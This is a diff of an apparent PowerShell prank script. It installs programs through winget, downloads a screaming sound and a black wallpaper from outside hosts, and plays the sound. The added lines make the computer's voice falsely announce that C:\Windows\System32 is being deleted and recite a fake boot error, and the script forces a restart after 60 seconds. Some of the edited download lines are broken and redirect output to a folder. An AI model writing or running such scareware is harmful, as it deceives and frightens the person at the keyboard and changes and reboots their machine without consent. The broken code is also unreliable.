@@ -18,7 +18,7 @@ conhost cmd retrobar
 winget install --id=valinet.ExplorerPatcher  -e --source winget
 Write-Host "Cool Com"
 
-curl https://static.wikia.nocookie.net/regretevator/images/6/67/Jaoba_screaming.wav/revision/latest?cb=20240913065709 > %temp%\jaoba.wav
+curl https://static.wikia.nocookie.net/regretevator/images/6/67/Jaoba_screaming.wav/revision/latest?cb=20240913065709 > ~\AppData\Local\Temp
 $PlayWav=New-Object System.Media.SoundPlayer
 $PlayWav.SoundLocation='%temp%\jaoba.wav'
 $PlayWav.playsync()
@@ -40,7 +40,7 @@ public class Wallpaper
 }
 "@
 Add-Type -TypeDefinition $setwallpapersrc
-curl https://blackscreen.space/images/pro/black-screen_39.png > %temp%\tempimg.png
+curl https://blackscreen.space/images/pro/black-screen_39.png >AppData\Local\Temp
 [Wallpaper]::SetWallpaper("%temp%\tempimg.png")
 
 winget install -e --id Mozilla.Firefox --source winget
@@ -60,8 +60,10 @@ echo "Operation Completed Successfully"
 
 $voice = New-Object -ComObject Sapi.spvoice
 $voice.rate = 0
-$voice.speak("Narrator enabled RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN RUN")
+$voice.speak("Narrator enabled Deleting C:\Windows\System32 Task Busy please wait")
+Start-Sleep -Seconds 3
+$voice.speak("Removed C:\Windows\System32: Restarting in 60 seconds after resc disk, ERROR CODE ntlm segmentation fault at line 9: abort bootloader")
 
-conhost cmd exit
-Write-Host "Restoring your mother in 60 seconds..."
+conhost cmd retrobar 
+Write-Host "Rem Exiting... "
 shutdown /r /t 60
